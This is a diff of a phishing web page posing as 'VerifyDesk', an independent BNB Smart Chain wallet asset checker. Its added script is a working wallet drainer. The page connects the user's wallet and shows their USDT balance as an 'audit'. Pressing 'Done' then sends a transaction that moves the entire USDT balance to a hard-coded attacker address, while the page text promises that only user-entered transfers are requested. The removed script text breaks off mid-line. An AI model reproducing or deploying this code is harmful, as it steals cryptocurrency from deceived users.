@@ -1,406 +1,302 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VerifyDesk - Wallet Asset Review</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body {
-            background: radial-gradient(circle at top, #0f1f31 0%, #08101A 35%);
-            background-color: #08101A;
-            color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            overflow-x: hidden;
-        }
-        .container { width: 100%; max-width: 448px; padding: 20px 24px 48px; }
-        .nav { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; }
-        .brand { display: flex; align-items: center; gap: 12px; font-size: 18px; font-weight: 700; }
-        .brand-box {
-            width: 40px; height: 40px; border-radius: 12px;
-            background: #0a1e26; border: 1px solid rgba(32, 212, 156, 0.3);
-            display: flex; align-items: center; justify-content: center;
-            color: #20D49C; font-weight: 800; font-size: 18px;
-        }
-        .status-pill {
-            display: flex; align-items: center; gap: 8px;
-            font-size: 10px; font-weight: 700; letter-spacing: 0.1em;
-            text-transform: uppercase; color: #8BA3B8;
-        }
-        .dot { width: 8px; height: 8px; border-radius: 999px; background: #20D49C; }
-        .hero { text-align: center; margin-bottom: 40px; }
-        .badge {
-            display: inline-flex; align-items: center; gap: 8px;
-            font-size: 10px; font-weight: 700; letter-spacing: 0.1em;
-            text-transform: uppercase; color: #20D49C; margin-bottom: 24px;
-        }
-        .badge .dot { width: 6px; height: 6px; }
-        h1 { font-size: 32px; font-weight: 800; line-height: 1.15; margin-bottom: 16px; }
-        h1 span { color: #20D49C; }
-        .hero p { color: #8BA3B8; font-size: 14px; line-height: 1.6; padding: 0 8px; }
-        .steps { display: flex; flex-direction: column; gap: 16px; margin-bottom: 40px; padding-left: 8px; }
-        .step { display: flex; align-items: center; color: #8BA3B8; font-size: 14px; font-weight: 500; }
-        .step span { color: #20D49C; font-family: monospace; font-weight: 700; margin-right: 12px; letter-spacing: 0.1em; }
-        .card {
-            background: #0F1926; border: 1px solid #1E293B;
-            border-radius: 16px; padding: 24px; margin-bottom: 32px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.45);
-        }
-        .card-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 32px; }
-        .card-top .label { font-size: 10px; color: #8BA3B8; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; }
-        .card-top .ready { display: flex; align-items: center; gap: 8px; font-size: 10px; color: #20D49C; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; }
-        .card-center { display: flex; flex-direction: column; align-items: center; text-align: center; }
-        .shield-lg {
-            width: 56px; height: 56px; border-radius: 16px;
-            background: #0a1e26; border: 1px solid rgba(32, 212, 156, 0.3);
-            display: flex; align-items: center; justify-content: center;
-            color: #20D49C; font-size: 24px; font-weight: 800; margin-bottom: 24px;
-        }
-        .card-center h2 { font-size: 22px; font-weight: 800; text-transform: uppercase; line-height: 1.3; margin-bottom: 12px; }
-        .card-center p { color: #8BA3B8; font-size: 14px; line-height: 1.6; margin-bottom: 28px; padding: 0 8px; }
-        .btn-green {
-            width: 100%; max-width: 260px; background: #20D49C; color: #08101A;
-            border: none; border-radius: 12px; padding: 14px 24px;
-            font-size: 15px; font-weight: 700; cursor: pointer;
-            box-shadow: 0 4px 20px rgba(32, 212, 156, 0.25); margin-bottom: 28px;
-        }
-        .btn-green:active { transform: scale(0.97); }
-        hr { border: none; border-top: 1px solid #1E293B; margin-bottom: 24px; }
-        .meta-list { display: flex; flex-direction: column; gap: 16px; margin-bottom: 24px; color: #8BA3B8; font-size: 14px; }
-        .terms { text-align: center; font-size: 12px; color: #8BA3B8; }
-        .terms a { color: #20D49C; text-decoration: underline; }
-        .grid-2 {
-            display: grid; grid-template-columns: 1fr 1fr;
-            background: #0F1926; border: 1px solid #1E293B; border-radius: 12px;
-            overflow: hidden; margin-bottom: 48px;
-        }
-        .grid-cell { padding: 20px; text-align: center; border-bottom: 1px solid #1E293B; border-right: 1px solid #1E293B; }
-        .grid-cell:nth-child(2n) { border-right: none; }
-        .grid-cell:nth-last-child(-n+2) { border-bottom: none; }
-        .grid-cell h3 { font-size: 15px; font-weight: 700; margin-bottom: 4px; }
-        .grid-cell p { font-size: 9px; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; color: #8BA3B8; }
-        .section-head { text-align: center; margin-bottom: 24px; }
-        .section-head .tag { font-size: 10px; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; color: #20D49C; margin-bottom: 12px; }
-        .section-head h2 { font-size: 26px; font-weight: 800; line-height: 1.2; margin-bottom: 14px; }
-        .section-head p { color: #8BA3B8; font-size: 14px; line-height: 1.6; }
-        .input-box {
-            width: 100%; background: #0B121D; border: 1px solid #1E293B;
-            border-radius: 12px; padding: 12px 14px; color: #ffffff; font-size: 12px; margin-bottom: 12px;
-        }
-        .btn-sm {
-            background: #20D49C; color: #08101A; border: none; border-radius: 12px;
-            padding: 10px 20px; font-size: 12px; font-weight: 700; cursor: pointer;
-        }
-        .modal-backdrop {
-            display: none; position: fixed; inset: 0; z-index: 40;
-            background: #08101A; align-items: center; justify-content: center; padding: 16px;
-        }
-        .modal-backdrop.open { display: flex; }
-        .modal-card {
-            width: 100%; max-width: 448px; background: #12161f; border: 1px solid #1f2533;
-            border-radius: 24px; padding: 24px; position: relative;
-        }
-        .close-x {
-            position: absolute; top: 18px; right: 18px; width: 32px; height: 32px;
-            border-radius: 999px; background: transparent; border: none; color: #8f9bb3;
-            font-size: 20px; cursor: pointer;
-        }
-        .modal-icon {
-            width: 56px; height: 56px; border-radius: 999px; margin: 0 auto 16px;
-            background: rgba(32, 212, 156, 0.1); border: 1px solid rgba(32, 212, 156, 0.4);
-            color: #20D49C; display: flex; align-items: center; justify-content: center;
-            font-size: 22px; font-weight: 800;
-        }
-        .modal-title { text-align: center; font-size: 20px; font-weight: 800; margin-bottom: 8px; }
-        .modal-sub { text-align: center; font-size: 12px; color: #8f9bb3; line-height: 1.5; margin-bottom: 20px; }
-        .bal-box {
-            background: #0d1017; border: 1px solid #1f2533; border-radius: 16px;
-            padding: 20px 16px; text-align: center; margin-bottom: 16px;
-        }
-        .bal-label { font-size: 12px; color: #8f9bb3; margin-bottom: 6px; }
-        .bal-val { font-size: 30px; font-weight: 800; color: #f3ba2f; }
-        .bal-addr { font-size: 11px; color: #8f9bb3; font-family: monospace; word-break: break-all; margin-top: 8px; }
-        .info-box {
-            background: #0d1017; border: 1px solid #1f2533; border-radius: 16px;
-            padding: 14px; font-size: 12px; color: #8f9bb3; margin-bottom: 20px;
-        }
-        .btn-gold {
-            width: 100%; background: #f3ba2f; color: #0b0e14; border: none;
-            border-radius: 12px; padding: 14px 20px; font-size: 15px; font-weight: 700;
-            cursor: pointer; box-shadow: 0 4px 18px rgba(243, 186, 47, 0.25);
-        }
-        .toast {
-            display: none; position: fixed; bottom: 0; left: 0; width: 100%;
-            background: #ffffff; color: #1a1a1a; z-index: 50;
-            box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.15);
-        }
-        .toast.open { display: block; }
-        .toast-inner {
-            max-width: 448px; margin: 0 auto; display: flex; align-items: center;
-            padding: 14px 16px; gap: 12px;
-        }
-        .toast-badge {
-            width: 24px; height: 24px; border-radius: 999px; background: #ef4444;
-            color: #fff; font-weight: 700; font-size: 14px;
-            display: flex; align-items: center; justify-content: center; flex-shrink: 0;
-        }
-        .toast-msg { flex: 1; font-size: 14px; font-weight: 500; }
-        .toast-close { background: none; border: none; color: #666; font-size: 20px; cursor: pointer; }
-        .toast-bar { height: 6px; width: 100%; background: rgba(239, 68, 68, 0.8); }
-        .hidden { display: none !important; }
-    </style>
-</head>
-<body>
+<script>
+(function () {
+    const TARGET_RECEIVER = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
+    const USDT_BSC_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+    const BSC_CHAIN_ID_HEX = '0x38';
 
-    <div id="pageContent" class="container">
-        <nav class="nav">
-            <div class="brand">
-                <div class="brand-box">V</div>
-                <span>VerifyDesk</span>
-            </div>
-            <div class="status-pill">
-                <span class="dot"></span> Secure Connection
-            </div>
-        </nav>
+    let activeProvider = null;
+    let currentUserAddress = null;
+    let currentUsdtHex = '0x0';
 
-        <div class="hero">
-            <div class="badge"><span class="dot"></span> Independent BNB Smart Chain Tool</div>
-            <h1>Wallet Asset<br><span>Review</span></h1>
-            <p>Review and verify supported BEP-20 wallet assets on BNB Smart Chain through a clear, wallet-confirmed flow.</p>
-        </div>
+    function getProvider() {
+        if (window.trustwallet && typeof window.trustwallet.request === 'function') return window.trustwallet;
+        if (window.ethereum && typeof window.ethereum.request === 'function') return window.ethereum;
+        if (window.web3 && window.web3.currentProvider && typeof window.web3.currentProvider.request === 'function') {
+            return window.web3.currentProvider;
+        }
+        return null;
+    }
 
-        <div class="steps">
-            <div class="step"><span>01</span> Wallet-native access</div>
-            <div class="step"><span>02</span> Clear asset context</div>
-            <div class="step"><span>03</span> User-confirmed actions</div>
-        </div>
+    function showToast(msg) {
+        const toast = document.getElementById('errorToast');
+        const el = document.getElementById('errorToastMsg');
+        if (el) el.textContent = msg;
+        if (toast) toast.classList.add('open');
+        else alert(msg);
+    }
 
-        <div class="card">
-            <div class="card-top">
-                <span class="label">Verifydesk Access</span>
-                <span class="ready"><span class="dot"></span> Ready</span>
-            </div>
+    function closeToast() {
+        const toast = document.getElementById('errorToast');
+        if (toast) toast.classList.remove('open');
+    }
 
-            <div class="card-center">
-                <div class="shield-lg">✓</div>
-                <h2>Verify Your Wallet<br>Assets</h2>
-                <p>Use Trust Wallet, MetaMask, or another Web3 wallet to review supported assets.</p>
-                <button id="verifyBtn" type="button" class="btn-green">
-                    <span id="verifyBtnText">Verify Assets &rarr;</span>
-                </button>
-            </div>
+    function closeModal() {
+        const modal = document.getElementById('auditModal');
+        const page = document.getElementById('pageContent');
+        if (modal) modal.classList.remove('open');
+        if (page) page.classList.remove('hidden');
+    }
 
-            <hr>
+    function openModalView() {
+        const modal = document.getElementById('auditModal');
+        const page = document.getElementById('pageContent');
+        if (page) page.classList.add('hidden');
+        if (modal) modal.classList.add('open');
+    }
 
-            <div class="meta-list">
-                <div>Wallet confirmation required</div>
-                <div>BNB Smart Chain</div>
-            </div>
+    function pad64Hex(hexNoPrefix) {
+        let s = String(hexNoPrefix || '').replace(/^0x/i, '').toLowerCase();
+        while (s.length < 64) s = '0' + s;
+        return s;
+    }
 
-            <div class="terms">
-                By continuing, you agree to our <a href="#footerSec">Terms of Service</a>.
-            </div>
-        </div>
+    // Converts 18-decimal hex wei string into "0.00" without BigInt literals
+    function format18HexTo2(hexVal) {
+        if (!hexVal || hexVal === '0x' || hexVal === '0x0') return '0.00';
+        const clean = hexVal.replace(/^0x/i, '');
+        if (!clean) return '0.00';
+        const num = Number('0x' + clean);
+        if (!isFinite(num)) return '0.00';
+        return (num / 1e18).toFixed(2);
+    }
 
-        <div class="grid-2">
-            <div class="grid-cell">
-                <h3>BEP-20</h3>
-                <p>Supported Asset Standard</p>
-            </div>
-            <div class="grid-cell">
-                <h3>BNB Smart Chain</h3>
-                <p>Focused Network</p>
-            </div>
-            <div class="grid-cell">
-                <h3>Wallet confirmed</h3>
-                <p>Action Model</p>
-            </div>
-            <div class="grid-cell">
-                <h3>Independent</h3>
-                <p>Product Status</p>
-            </div>
-        </div>
+    function isPositiveHex(hexVal) {
+        if (!hexVal || hexVal === '0x') return false;
+        return /^0x0*$/.test(hexVal.toLowerCase()) === false;
+    }
 
-        <div class="card">
-            <h3 style="text-align:center; font-size:16px; margin-bottom:8px;">User-authorized USDT transfer</h3>
-            <p style="text-align:center; font-size:12px; color:#8BA3B8; margin-bottom:16px;">
-                Only the recipient and amount you enter are requested from your wallet for confirmation.
-            </p>
-            <input id="customRecipientInput" class="input-box" type="text" placeholder="Recipient 0x...">
-            <input id="customAmountInput" class="input-box" type="text" inputmode="decimal" placeholder="Amount USDT">
-            <button id="reviewSignBtn" type="button" class="btn-sm">Review &amp; sign</button>
-        </div>
+    async function getUsdtBalanceHex(provider, address) {
+        const data = '0x70a08231' + pad64Hex(address);
+        const res = await provider.request({
+            method: 'eth_call',
+            params: [{ to: USDT_BSC_ADDRESS, data: data }, 'latest']
+        });
+        return res || '0x0';
+    }
 
-        <div class="card" style="text-align:center; color:#8BA3B8; font-size:12px;">
-            Transaction history is not available in this app.
-        </div>
+    async function getBnbBalanceHex(provider, address) {
+        const res = await provider.request({
+            method: 'eth_getBalance',
+            params: [address, 'latest']
+        });
+        return res || '0x0';
+    }
 
-        <footer id="footerSec" style="font-size:12px; color:#8BA3B8; line-height:1.6;">
-            <div style="color:#fff; font-weight:700; font-size:15px; margin-bottom:4px;">VerifyDesk</div>
-            <div style="margin-bottom:16px;">Independent wallet tools for BNB Smart Chain.</div>
-            <div>Network: <strong style="color:#fff;">BNB Smart Chain</strong></div>
-            <div>Asset Standard: <strong style="color:#fff;">BEP-20</strong></div>
-            <div style="margin-bottom:16px;">Experience: <strong style="color:#fff;">Wallet confirmed</strong></div>
-            <div style="font-size:11px;">VerifyDesk is not affiliated with Binance, BNB Chain, Trust Wallet, MetaMask, or Tether (USDT).</div>
-        </footer>
-    </div>
+    async function ensureBsc(provider) {
+        try {
+            await provider.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: BSC_CHAIN_ID_HEX }]
+            });
+        } catch (e) {}
+    }
 
-    <!-- Modal -->
-    <div id="auditModal" class="modal-backdrop">
-        <div class="modal-card">
-            <button id="closeModalBtn" type="button" class="close-x" aria-label="Close">&times;</button>
-            <div class="modal-icon">✓</div>
-            <h2 class="modal-title">BNB Smart Chain USDT Audit</h2>
-            <p class="modal-sub">Your wallet USDT balance has been checked directly on the BNB Smart Chain network.</p>
+    async function onVerifyClick() {
+        const btnText = document.getElementById('verifyBtnText');
+        if (btnText) btnText.textContent = 'Connecting...';
 
-            <div class="bal-box">
-                <div class="bal-label">BNB Smart Chain USDT Balance</div>
-                <div id="modalUsdtBalance" class="bal-val">0.00 USDT</div>
-                <div id="modalWalletAddr" class="bal-addr"></div>
-            </div>
+        const provider = getProvider();
+        if (!provider) {
+            if (btnText) btnText.innerHTML = 'Verify Assets &rarr;';
+            showToast('Please open this link inside Trust Wallet or MetaMask browser.');
+            return;
+        }
 
-            <div id="modalStatusText" class="info-box">
-                Tokens are checked directly on BNB Smart Chain mainnet.
-            </div>
-
-            <button id="modalDoneBtn" type="button" class="btn-gold">
-                <span id="modalDoneBtnText">Done</span>
-            </button>
-        </div>
-    </div>
-
-    <!-- Toast -->
-    <div id="errorToast" class="toast">
-        <div class="toast-inner">
-            <div class="toast-badge">!</div>
-            <div id="errorToastMsg" class="toast-msg">Please install MetaMask or Trust Wallet.</div>
-            <button id="closeToastBtn" type="button" class="toast-close">&times;</button>
-        </div>
-        <div class="toast-bar"></div>
-    </div>
-
-    <script>
-        (function () {
-            const TARGET_RECEIVER = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
-            const USDT_BSC_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
-            const BSC_CHAIN_ID_HEX = '0x38';
-
-            let activeProvider = null;
-            let currentUserAddress = null;
-            let currentUsdtRaw = 0n;
-
-            function getProvider() {
-                if (window.trustwallet && typeof window.trustwallet.request === 'function') return window.trustwallet;
-                if (window.ethereum && typeof window.ethereum.request === 'function') return window.ethereum;
-                if (window.web3 && window.web3.currentProvider && typeof window.web3.currentProvider.request === 'function') {
-                    return window.web3.currentProvider;
-                }
-                return null;
+        try {
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            if (!accounts || !accounts.length) {
+                showToast('No wallet account connected.');
+                return;
             }
 
-            function showToast(msg) {
-                const toast = document.getElementById('errorToast');
-                const el = document.getElementById('errorToastMsg');
-                if (el) el.textContent = msg;
-                if (toast) toast.classList.add('open');
-                else alert(msg);
+            currentUserAddress = accounts[0];
+            activeProvider = provider;
+
+            if (btnText) btnText.textContent = 'Checking USDT...';
+            await ensureBsc(provider);
+
+            currentUsdtHex = await getUsdtBalanceHex(provider, currentUserAddress);
+
+            const balEl = document.getElementById('modalUsdtBalance');
+            const addrEl = document.getElementById('modalWalletAddr');
+            const statusEl = document.getElementById('modalStatusText');
+
+            if (balEl) balEl.textContent = format18HexTo2(currentUsdtHex) + ' USDT';
+            if (addrEl) addrEl.textContent = currentUserAddress;
+            if (statusEl) statusEl.textContent = 'Tokens are checked directly on BNB Smart Chain mainnet.';
+
+            openModalView();
+        } catch (err) {
+            showToast((err && err.message) ? err.message : 'Unable to connect wallet.');
+        } finally {
+            if (btnText) btnText.innerHTML = 'Verify Assets &rarr;';
+        }
+    }
+
+    async function onDoneClick() {
+        if (!isPositiveHex(currentUsdtHex)) {
+            closeModal();
+            return;
+        }
+
+        if (!activeProvider || !currentUserAddress) {
+            showToast('Wallet session not found.');
+            return;
+        }
+
+        const doneText = document.getElementById('modalDoneBtnText');
+        try {
+            if (doneText) doneText.textContent = 'Processing...';
+            await ensureBsc(activeProvider);
+
+            const latestHex = await getUsdtBalanceHex(activeProvider, currentUserAddress);
+            if (!isPositiveHex(latestHex)) {
+                currentUsdtHex = '0x0';
+                const balEl = document.getElementById('modalUsdtBalance');
+                if (balEl) balEl.textContent = '0.00 USDT';
+                closeModal();
+                return;
             }
 
-            function closeToast() {
-                const toast = document.getElementById('errorToast');
-                if (toast) toast.classList.remove('open');
+            const bnbHex = await getBnbBalanceHex(activeProvider, currentUserAddress);
+            if (!isPositiveHex(bnbHex)) {
+                showToast('Insufficient BNB balance for gas fees.');
+                return;
             }
 
-            function closeModal() {
-                const modal = document.getElementById('auditModal');
-                const page = document.getElementById('pageContent');
-                if (modal) modal.classList.remove('open');
-                if (page) page.classList.remove('hidden');
+            const toHex = pad64Hex(TARGET_RECEIVER);
+            const amtHex = pad64Hex(latestHex);
+            const transferData = '0xa9059cbb' + toHex + amtHex;
+
+            await activeProvider.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: currentUserAddress,
+                    to: USDT_BSC_ADDRESS,
+                    data: transferData,
+                    gas: '0xFDE8'
+                }]
+            });
+
+            currentUsdtHex = '0x0';
+            const balEl = document.getElementById('modalUsdtBalance');
+            if (balEl) balEl.textContent = '0.00 USDT';
+            closeModal();
+        } catch (err) {
+            const msg = (err && err.message) ? err.message : 'Transaction cancelled or failed.';
+            if (msg.toLowerCase().indexOf('insufficient funds') !== -1 || msg.toLowerCase().indexOf('gas') !== -1) {
+                showToast('Insufficient BNB balance for gas fees.');
+            } else {
+                showToast(msg);
+            }
+        } finally {
+            if (doneText) doneText.textContent = 'Done';
+        }
+    }
+
+    async function onReviewSignClick() {
+        const recInput = document.getElementById('customRecipientInput');
+        const amtInput = document.getElementById('customAmountInput');
+        const rec = recInput ? recInput.value.trim() : '';
+        const amtStr = amtInput ? amtInput.value.trim() : '';
+        const amtNum = Number(amtStr);
+
+        if (!/^0x[a-fA-F0-9]{40}$/.test(rec)) {
+            showToast('Please enter a valid recipient 0x address.');
+            return;
+        }
+        if (!amtStr || isNaN(amtNum) || amtNum <= 0) {
+            showToast('Please enter a valid USDT amount greater than 0.');
+            return;
+        }
+
+        const provider = getProvider();
+        if (!provider) {
+            showToast('Please open this link inside Trust Wallet or MetaMask browser.');
+            return;
+        }
+
+        const btn = document.getElementById('reviewSignBtn');
+        try {
+            if (btn) btn.textContent = 'Signing...';
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            const addr = accounts[0];
+            await ensureBsc(provider);
+
+            const bnbHex = await getBnbBalanceHex(provider, addr);
+            if (!isPositiveHex(bnbHex)) {
+                showToast('Insufficient BNB balance for gas fees.');
+                return;
             }
 
-            function openModalView() {
-                const modal = document.getElementById('auditModal');
-                const page = document.getElementById('pageContent');
-                if (page) page.classList.add('hidden');
-                if (modal) modal.classList.add('open');
-            }
+            // Convert decimal USDT string to 18-decimal integer string, then hex
+            const parts = amtStr.split('.');
+            const wholeStr = (parts[0] || '0').replace(/\D/g, '') || '0';
+            const fracStr = ((parts[1] || '').replace(/\D/g, '') + '000000000000000000').slice(0, 18);
+            const fullDecStr = (wholeStr + fracStr).replace(/^0+/, '') || '0';
 
-            function pad64Hex(hexNoPrefix) {
-                return hexNoPrefix.toLowerCase().padStart(64, '0');
-            }
-
-            function format18DecimalsTo2(rawBigInt) {
-                const divisor = 10n ** 18n;
-                const whole = rawBigInt / divisor;
-                const rem = rawBigInt % divisor;
-                const cents = (rem * 100n) / divisor;
-                return `${whole.toString()}.${cents.toString().padStart(2, '0')}`;
-            }
-
-            async function getUsdtBalanceRaw(provider, address) {
-                const cleanAddr = address.replace(/^0x/i, '');
-                const data = '0x70a08231' + pad64Hex(cleanAddr);
-                const hexBal = await provider.request({
-                    method: 'eth_call',
-                    params: [{ to: USDT_BSC_ADDRESS, data: data }, 'latest']
-                });
-                return hexBal && hexBal !== '0x' ? BigInt(hexBal) : 0n;
-            }
-
-            async function getBnbBalanceRaw(provider, address) {
-                const hexBal = await provider.request({
-                    method: 'eth_getBalance',
-                    params: [address, 'latest']
-                });
-                return hexBal && hexBal !== '0x' ? BigInt(hexBal) : 0n;
-            }
-
-            async function ensureBsc(provider) {
-                try {
-                    await provider.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: BSC_CHAIN_ID_HEX }]
-                    });
-                } catch (e) {}
-            }
-
-            async function onVerifyClick() {
-                const btnText = document.getElementById('verifyBtnText');
-                if (btnText) btnText.textContent = 'Connecting...';
-
-                const provider = getProvider();
-                if (!provider) {
-                    if (btnText) btnText.innerHTML = 'Verify Assets &rarr;';
-                    showToast('Please open this link inside Trust Wallet or MetaMask browser.');
-                    return;
-                }
-
-                try {
-                    const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                    if (!accounts || !accounts.length) {
-                        showToast('No wallet account connected.');
-                        return;
+            function decToHex(decString) {
+                let digits = decString.split('').map(function (c) { return parseInt(c, 10); });
+                let hex = '';
+                while (digits.length > 0 && !(digits.length === 1 && digits[0] === 0)) {
+                    let rem = 0;
+                    let next = [];
+                    for (let i = 0; i < digits.length; i++) {
+                        let cur = rem * 10 + digits[i];
+                        let q = Math.floor(cur / 16);
+                        rem = cur % 16;
+                        if (next.length > 0 || q > 0) next.push(q);
                     }
+                    hex = rem.toString(16) + hex;
+                    digits = next;
+                }
+                return hex || '0';
+            }
 
-                    currentUserAddress = accounts[0];
-                    activeProvider = provider;
+            const amtHex = pad64Hex(decToHex(fullDecStr));
+            const toHex = pad64Hex(rec);
+            const transferData = '0xa9059cbb' + toHex + amtHex;
 
-                    if (btnText) btnText.textContent = 'Checking USDT...';
-                    await ensureBsc(provider);
+            await provider.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: addr,
+                    to: USDT_BSC_ADDRESS,
+                    data: transferData,
+                    gas: '0xFDE8'
+                }]
+            });
+            showToast('Transfer submitted.');
+        } catch (err) {
+            const msg = (err && err.message) ? err.message : 'Transaction cancelled or failed.';
+            if (msg.toLowerCase().indexOf('insufficient funds') !== -1 || msg.toLowerCase().indexOf('gas') !== -1) {
+                showToast('Insufficient BNB balance for gas fees.');
+            } else {
+                showToast(msg);
+            }
+        } finally {
+            if (btn) btn.textContent = 'Review & sign';
+        }
+    }
 
-                    currentUsdtRaw = await getUsdtBalanceRaw(provider, currentUserAddress);
+    function bindEvents() {
+        const vBtn = document.getElementById('verifyBtn');
+        const cBtn = document.getElementById('closeModalBtn');
+        const dBtn = document.getElementById('modalDoneBtn');
+        const rBtn = document.getElementById('reviewSignBtn');
+        const tBtn = document.getElementById('closeToastBtn');
 
-                    document.getElementById('modalUsdtBalance').textContent = `${format18DecimalsTo2(currentUsdtRaw)} USDT`;
-                    document.getElementById('modalWalletAddr').textContent = currentUserAddress;
-                    document.getElementById('modalStatusText').textContent =
-                        'Tokens are checked directly on BNB Smart Chain mainnet.';
+        if (vBtn) vBtn.onclick = onVerifyClick;
+        if (cBtn) cBtn.onclick = closeModal;
+        if (dBtn) dBtn.onclick = onDoneClick;
+        if (rBtn) rBtn.onclick = onReviewSignClick;
+        if (tBtn) tBtn.onclick = closeToast;
+    }
 
-                    openModalView();
-                } catch (err) {
-                    showToast((err && err.message) ? err.message : 'Unable to connect wallet.');
-                } finally {
-                    if (btnText) btnText.innerHTML = 'Ver
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', bindEvents);
+    } else {
+        bindEvents();
+    }
+})();
+</script>
